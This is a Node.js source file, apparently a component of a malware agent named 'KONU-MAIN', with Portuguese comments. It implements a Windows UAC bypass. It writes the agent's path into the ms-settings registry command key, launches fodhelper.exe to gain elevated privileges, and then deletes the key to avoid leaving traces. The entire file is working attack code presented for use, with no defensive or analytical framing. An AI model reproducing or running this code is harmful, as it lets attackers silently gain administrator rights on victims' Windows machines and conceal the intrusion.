const { execSync } = require('child_process');
const fs = require('fs');
const os = require('os');

/**
 * KONU-MAIN | PRIVILEGE ESCALATION MODULE
 * Version: 2.0 (APT-Grade)
 * Focus: UAC Bypass via Fodhelper
 */

class PrivEsc {
    constructor() {
        this.isWindows = os.platform() === 'win32';
        // Caminho do agente atual
        this.agentPath = process.execPath; 
    }

    async execute() {
        if (!this.isWindows) {
            console.log('[!] Non-Windows system detected. Skipping PrivEsc.');
            return false;
        }

        try {
            if (this.isAdmin()) {
                console.log('[+] Already running with Administrator privileges.');
                return true;
            }

            console.log('[*] Attempting UAC Bypass via Fodhelper...');
            const success = await this.bypassUAC();

            if (success) {
                console.log('[+] Privilege escalation successful. Now running as SYSTEM/Admin.');
                return true;
            } else {
                console.log('[-] UAC Bypass failed. Running with limited privileges.');
                return false;
            }
        } catch (error) {
            console.error(`[-] PrivEsc error: ${error.message}`);
            return false;
        }
    }

    isAdmin() {
        try {
            // Tenta executar um comando que só administradores podem fazer
            execSync('net session', { stdio: 'ignore' });
            return true;
        } catch (e) {
            return false;
        }
    }

    async bypassUAC() {
        /**
         * Técnica: Fodhelper Registry Hijacking
         * O fodhelper.exe é um binário confiável que ignora o UAC.
         * Nós criamos uma chave no registro que redireciona a execução do fodhelper
         * para o nosso agente.
         */
        const registryPath = `HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command`;
        const delegateValue = this.agentPath;

        try {
            // 1. Cria a chave de comando do ms-settings
            execSync(`reg add "${registryPath}" /v "DelegateExecute" /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });
            
            // 2. Remove a chave 'DelegateExecute' para forçar o Windows a ler o valor padrão (default)
            // Isso é necessário para que o bypass funcione em versões recentes do Windows 10/11
            execSync(`reg delete "${registryPath}" /v "DelegateExecute" /f`, { stdio: 'ignore' });

            // 3. Define o valor padrão da chave para o caminho do nosso agente
            execSync(`reg add "${registryPath}" /ve /t REG_SZ /d "${delegateValue}" /f`, { stdio: 'ignore' });

            // 4. Executa o fodhelper para disparar a elevação
            execSync('cmd.exe /c start fodhelper.exe', { stdio: 'ignore' });

            // 5. Limpeza rápida do registro para não deixar rastros óbvios
            setTimeout(() => {
                try {
                    execSync(`reg delete "${registryPath}" /f`, { stdio: 'ignore' });
                } catch (e) {}
            }, 5000);

            return true;
        } catch (e) {
            console.error(`[-] Registry manipulation failed: ${e.message}`);
            return false;
        }
    }
}

module.exports = new PrivEsc();
